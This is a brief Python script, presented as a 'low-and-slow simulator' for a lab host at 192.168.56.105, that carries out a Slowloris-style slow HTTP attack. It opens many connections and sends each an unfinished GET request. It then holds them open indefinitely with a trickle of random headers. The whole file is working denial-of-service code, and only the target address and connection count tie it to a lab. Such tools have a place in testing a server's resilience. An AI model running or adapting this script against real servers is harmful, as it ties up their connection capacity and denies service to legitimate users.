import socket
import time
import random

TARGET = "192.168.56.105"
PORT = 80

CONNECTIONS = 20
INTERVAL = 5

print("=" * 60)
print("       SLOW HTTP / LOW-AND-SLOW SIMULATOR")
print("=" * 60)

print(f"Target      : {TARGET}")
print(f"Port        : {PORT}")
print(f"Connections : {CONNECTIONS}")
print("=" * 60)

sockets = []

try:
    for i in range(CONNECTIONS):

        s = socket.socket(
            socket.AF_INET,
            socket.SOCK_STREAM
        )

        s.settimeout(5)

        try:
            s.connect((TARGET, PORT))

            # Send an incomplete HTTP request.
            s.sendall(
                b"GET / HTTP/1.1\r\n"
                b"Host: lab-test\r\n"
            )

            sockets.append(s)

            print(
                f"[+] Connection {i + 1:02d} "
                f"opened and kept incomplete"
            )

        except Exception as e:
            print(
                f"[-] Connection {i + 1:02d} failed: {e}"
            )
            s.close()

        time.sleep(INTERVAL)

    print("\nConnections are being kept open.")
    print("Press Ctrl+C to stop the simulation.")

    while True:
        for s in sockets:
            try:
                # Slowly send another HTTP header fragment.
                header = (
                    f"X-Test-{random.randint(1,9999)}: "
                    f"lab\r\n"
                ).encode()

                s.sendall(header)

            except Exception:
                pass

        time.sleep(10)

except KeyboardInterrupt:
    print("\nStopping simulation...")

finally:
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

    print("All test connections closed.")
